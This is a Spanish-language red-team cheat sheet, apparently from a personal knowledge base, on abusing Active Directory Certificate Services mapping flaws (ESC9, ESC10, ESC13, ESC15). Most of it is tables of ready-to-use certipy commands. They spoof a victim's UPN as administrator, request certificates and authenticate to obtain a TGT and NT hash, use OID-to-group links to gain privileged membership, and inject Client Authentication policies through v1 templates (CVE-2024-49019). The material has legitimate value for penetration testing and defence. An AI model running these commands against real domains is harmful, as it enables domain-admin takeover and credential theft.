---
aliases:
  - ESC9 ESC10 ESC13 ESC15
  - ADCS Mapping Abuse
  - UPN Spoofing
tags:
  - technique/privilege-escalation
  - asset/active-directory
  - env/windows
  - service/ad-cs
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: SubCheatSheet
linked:
  - "[[AD CS Abuse]]"
  - "[[Certifried (CVE-2022-26923)]]"
---
# AD CS Abuse - Mapping ESCs (ESC9-ESC15)

> Abusos del **mapeo cert ↔ identidad**: UPN spoofing, policy OIDs ligados a grupos, y plantillas v1.

---

## ESC9 / ESC10 — UPN Spoofing

> El cert no liga `objectSID` fuerte (pre-KB5014754 / `StrongCertificateBindingEnforcement=0`). Con WriteProperty sobre una víctima, cambiar su UPN al de un DA, pedir cert, restaurar.

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `certipy account update -u attacker -p $P -user victim -upn administrator` | Cambia el UPN de `victim` a `administrator` | Tenés WriteProperty sobre victim. |
| `certipy req -u victim -p vpass -ca $CA -template Template` | Cert que aparece como administrator | Tras el cambio de UPN. |
| `certipy auth -pfx victim.pfx -dc-ip $IP` | TGT + NT hash de administrator | Mapeo débil (ESC9/10). |
| `certipy account update -u attacker -p $P -user victim -upn victim@corp.local` | Restaurar el UPN original | Cleanup. |
^adcs-esc9-10

## ESC13 — Policy OID → AD Group

> Template con OID de policy ligado a un grupo privilegiado (`msDS-OIDToGroupLink`) → el cert otorga membership efectiva.

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `certipy req -u $U -p $P -ca $CA -template ESC13Template` | Cert cuyo OID mapea a un grupo privilegiado | `msDS-OIDToGroupLink` configurado. |
^adcs-esc13

## ESC15 — v1 Template + Client Auth (EKUwu, CVE-2024-49019)

> Templates v1 con Client Auth permiten inyectar application policies → SAN spoofing.

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `certipy req -u $U -p $P -ca $CA -template WebServer -upn administrator@corp.local -application-policies 'Client Authentication'` | Cert como administrator vía template v1 | ESC15 (CVE-2024-49019). |
^adcs-esc15

### Nota ESC para máquinas

> El abuso de **machine account + dNSHostName** para cert de DA es **Certifried (CVE-2022-26923)** → ver [[Certifried (CVE-2022-26923)]] (técnica relacionada, no requiere template vulnerable).
